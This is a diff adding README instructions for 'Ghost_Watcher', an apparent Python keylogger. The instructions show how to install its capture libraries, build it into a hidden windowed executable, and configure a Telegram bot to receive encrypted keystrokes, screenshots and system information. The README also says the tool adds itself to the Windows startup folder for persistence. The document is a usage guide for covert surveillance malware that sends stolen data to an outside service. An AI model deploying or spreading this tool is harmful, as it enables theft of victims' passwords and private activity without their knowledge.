@@ -41,4 +41,65 @@ git clone https://github.com/MintViper03/Ghost_Watcher.git
 cd Ghost_Watcher
 ```
 
+### 2. Install Dependencies
+
+Install the required Python libraries:
+
+```bash
+pip install pynput pyperclip requests pyautogui cryptography pywin32
+```
+### Or
+
+You can merge all the files into one apk. That apk checks if python is installed in that system. If not, it can automatically install Python and its libraries and then run the script.
+
+```bash
+cd Ghost_Watcher
+pyinstaller --onefile --windowed ghost_watcher.py
+```
+
+## Configuration
+
+### 1. Setup Telegram Bot
+1. Open Telegram and search for the BotFather.
+2. Create a new bot using the /newbot command.
+3. Save the API token provided by BotFather.
+4. Start a chat with your bot and send a message.
+5. Use the following URL to get your chat ID (replace YOUR_TOKEN with your bot's token):
+   `https://api.telegram.org/botYOUR_TOKEN/getUpdates`
+6. Look for the chat.id field in the JSON response.
+
+### 2. Update Script Configuration
+Open the script (`ghost_watcher.py`) and update the following variables:
+
+```Python
+TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot's token
+CHAT_ID = "YOUR_CHAT_ID"           # Replace with your chat ID
+```
+
+## Usage
+
+### 1. Run the Script or Apk File
+
+Execute the script:
+
+```bash
+python3 ghost_watcher.py
+```
+The script will:
+- Start capturing keystrokes.
+- Take screenshots at regular intervals.
+- Collect system information.
+- Encrypt and send logs to your Telegram bot.
+
+### 2. Persistence (Optional)
+The script automatically adds itself to the Windows startup folder. If you want to disable this feature, comment out the following line in the script:
+```Python
+add_to_startup()
+```
+
+### 3. Stopping the Script
+To stop the script, press `Ctrl + C` in the terminal where it is running.
+### Or
+If you run APK, then remove it from the task manager running processes and startup folder.
+
 
